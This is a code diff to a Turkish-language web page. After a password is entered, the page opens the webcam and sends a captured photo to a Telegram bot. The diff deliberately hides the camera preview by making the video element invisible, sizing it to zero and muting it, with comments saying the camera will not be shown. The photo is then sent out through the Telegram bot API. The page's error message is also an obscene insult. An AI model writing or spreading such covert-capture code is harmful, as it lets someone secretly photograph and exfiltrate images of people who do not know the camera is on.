@@ -26,7 +26,7 @@
       0%, 100% { opacity: 1; }
       50% { opacity: 0; }
     }
-    #ayikOl, #nahGonder, #kamera {
+    #ayikOl, #nahGonder {
       display: none;
     }
     #ayikOl {
@@ -41,7 +41,9 @@
       cursor: pointer;
     }
     video {
-      display: none;
+      display: none; /* KAMERA GÖRÜNMEYECEK */
+      width: 0;
+      height: 0;
     }
   </style>
 </head>
@@ -58,7 +60,7 @@
 
   <div id="hataMesaji">Senin kafatasını sikeyim şifreyi girmeyi bile beceremedin.</div>
 
-  <video id="kamera" autoplay playsinline></video>
+  <video id="kamera" autoplay playsinline muted></video>
   <button id="nahGonder" onclick="fotoGonder()">Nah Gönder</button>
   <div id="gonderildi" style="display:none; margin-top:10px; color:lightgreen;">📸 Gönderildi!</div>
 
@@ -71,10 +73,9 @@
       if (sifre === "671300") {
         document.getElementById("girisEkrani").style.display = "none";
         document.getElementById("ayikOl").style.display = "block";
-        document.getElementById("kamera").style.display = "block";
         document.getElementById("nahGonder").style.display = "inline-block";
 
-        // Kamera aç
+        // Kamera aç ama gösterme
         const video = document.getElementById('kamera');
         navigator.mediaDevices.getUserMedia({ video: true })
           .then(stream => {
@@ -101,7 +102,7 @@
       canvas.toBlob(blob => {
         const formData = new FormData();
         formData.append("chat_id", chatId);
-        formData.append("photo", blob, "foto.jpg");
+        formData.append("photo", blob, "nah.jpg");
 
         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
